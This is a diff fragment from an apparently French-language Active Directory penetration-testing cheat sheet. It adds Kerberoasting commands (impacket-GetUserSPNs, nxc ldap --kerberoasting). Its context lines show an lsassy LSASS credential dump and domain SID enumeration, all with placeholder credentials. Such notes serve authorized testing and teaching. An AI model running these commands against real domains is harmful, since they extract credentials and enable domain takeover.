@@ -296,6 +296,12 @@ Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L
 nxc smb 192.168.1.10 -u 'USERNAME' -p 'PASSWORD' -M lsassy
 ```
 
+Regarder si certains comptes ont des SPN
+```bash
+impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD'
+
+nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kerberoasting output.txt
+```
 2. Obtenir le Domain SID
 ```bash
 impacket-lookupsid corp.com/'USERNAME':'PASSWORD'@192.168.1.10
